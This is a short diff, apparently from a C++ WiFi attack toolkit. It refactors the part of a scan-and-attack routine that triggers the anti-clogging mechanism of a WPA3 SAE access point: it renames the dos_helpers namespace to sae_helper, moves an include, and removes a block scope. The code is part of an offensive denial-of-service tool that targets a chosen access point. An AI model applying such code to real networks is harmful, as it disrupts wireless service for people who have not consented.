@@ -1,10 +1,10 @@
 #include "attacks/scan/scan_AP.h"
 #include <future>
+#include <sys/poll.h>
 #include "config/RunStatus.h"
 #include "observer/observers.h"
 #include "scan/scan_EAP.h"
 #include "scan/scan_STA.h"
-#include <sys/poll.h>
 
 #include "attacks/components/sniffer_helper.h"
 #include "attacks/DoS_hard/cookie_guzzler/cookie_guzzler.h"
@@ -166,24 +166,20 @@ void run_attack(RunStatus &rs){
 	}
 
 	if(att_cfg.value("ACM_trigger", false)){
-		const optional<dos_helpers::SAEPair> sae_params = cookie_guzzler::get_commit_values(
+		const optional<sae_helper::SAEPair> sae_params = cookie_guzzler::get_commit_values(
 			rs, scanner["iface"], scanner["sniff_iface"], scan_ap.ssid, target_ap["mac"], 30);
-
 		const auto [cookie, count] = pmk_gobbler::trigger_acm(scanner["sniff_iface"], scanner["mac"],
 															HWAddress < 6 > (target_ap["mac"]),
 															att_cfg.at("acm_trigger_count").get<int>(),
 															sae_params.value());
-
-		{
-			const path acm_txt = rs.run_folder()/ "ACM_trigger.txt";
-			ofstream ofs(acm_txt);
-			ofs << "ACM trigger after " << count << " frames " << "\n";
-			ofs << scan_ap.to_str() << "\n";
-			ofs << dos_helpers::bytes_to_hex(cookie.token) << "\n";
-			ofs << cookie.sta_mac << "\n";
-			ofs.close();
-			set_public_perms(acm_txt);
-		}
+		const path acm_txt = rs.run_folder()/ "ACM_trigger.txt";
+		ofstream ofs(acm_txt);
+		ofs << "ACM trigger after " << count << " frames " << "\n";
+		ofs << scan_ap.to_str() << "\n";
+		ofs << sae_helper::bytes_to_hex(cookie.token) << "\n";
+		ofs << cookie.sta_mac << "\n";
+		ofs.close();
+		set_public_perms(acm_txt);
 	}
 }
 }
